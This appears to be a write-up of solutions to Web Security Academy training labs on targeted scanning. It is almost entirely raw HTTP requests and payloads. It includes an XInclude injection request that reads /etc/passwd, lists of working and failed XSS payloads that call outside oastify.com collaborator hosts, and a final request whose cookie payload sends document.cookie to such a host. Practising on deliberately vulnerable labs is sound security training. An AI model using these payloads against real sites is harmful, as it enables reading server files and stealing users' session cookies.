## 1. Discovering vulnerabilities quickly with targeted scanning

```
POST /product/stock HTTP/2
Host: 0a9200290378e82181399db40081001e.web-security-academy.net
Cookie: session=RMej11L451gLhhqXoWTJ0tGgzm4Dcdkw
Content-Length: 190
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: https://0a9200290378e82181399db40081001e.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a9200290378e82181399db40081001e.web-security-academy.net/product?productId=4
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

productId=%3cfoo%20xmlns%3axi%3d%22http%3a%2f%2fwww.w3.org%2f2001%2fXInclude%22%3e%3cxi%3ainclude%20parse%3d%22text%22%20href%3d%22file%3a%2f%2f%2fetc%2fpasswd%22%2f%3e%3c%2ffoo%3e&storeId=1
```

## 2. Scanning non-standard data structures

Successful payloads

```
'"><svg/onload=fetch`//c5imi83ey2qfafjf1myou9ga91fx3nrfh38tvjj8\.oastify.com`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch`//q5wjvfgp90f1ngxczt93y3b6kxqtej28\.oastify.com\/a`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch`//b2e4s0da6lcmk1uxwe6ovo8rhinfb5zu\.oastify.com\/a?`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch`//7z70pwa63h9ihxrtta3ksk5neeke84wt\.oastify.com\/a?c=\${}`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//lpeefa0ktvzw7bh7jotyiyv14satykm9\.oastify.com`)>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//7270swd66hcikxutwa6kvk8nhenhb7zw\.oastify.com\/`.concat(`1`))>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//7270swd66hcikxutwa6kvk8nhenhb7zw\.oastify.com\/`.concat(String(1)))>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//hyjao69g2r8sg7q3sk2uru4xdojs7iv7\.oastify.com\/`.concat(String(window)))>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//bds430oahlnmv15x7eho6ojrsiynmda2\.oastify.com\/`.concat(String(window.document)))>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
```

Failed payloads

```
'"><img/src/onerror=fetch("https://q5wjvfgp90f1ngxczt93y3b6kxqtej28.oastify.com/?c=1")/>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><img/src/onerror=fetch`//https://q5wjvfgp90f1ngxczt93y3b6kxqtej28\.oastify.com`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch`//7z70pwa63h9ihxrtta3ksk5neeke84wt\.oastify.com\/a?c=${}`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch`//8en14xp7iiojwy6u8bil7lkotfzgn6bv\.oastify.com\/a?c=${123}`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch("8en14xp7iiojwy6u8bil7lkotfzgn6bv.oastify.com")>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch('8en14xp7iiojwy6u8bil7lkotfzgn6bv.oastify.com')>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch('https://8en14xp7iiojwy6u8bil7lkotfzgn6bv.oastify.com')>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`https://8en14xp7iiojwy6u8bil7lkotfzgn6bv.oastify.com`)>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch`https\:\/\/c5imi83ey2qfafjf1myou9ga91fx3nrfh38tvjj8\.oastify.com`>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//7270swd66hcikxutwa6kvk8nhenhb7zw\.oastify.com\/`.concat(document))>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
'"><svg/onload=fetch(`//hyjao69g2r8sg7q3sk2uru4xdojs7iv7\.oastify.com\/`.concat(String(document)))>:dLQyHGSdbpFn2uqdunFzQavrNUbOmdcu

```

Final Request

```
GET / HTTP/2
Host: 0afb00e3038b0aba81d5348c005500c1.web-security-academy.net
Cookie: session='%22%3e%3csvg%2fonload%3dfetch(%60%2f%2frytkog9q2182ghqdsu24r447dyjp9dz1o%5c.oastify.com%5c%2f%60.concat(String(window.document.cookie)))%3e%3adLQyHGSdbpFn2uqdunFzQavrNUbOmdcu
Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0afb00e3038b0aba81d5348c005500c1.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i


```
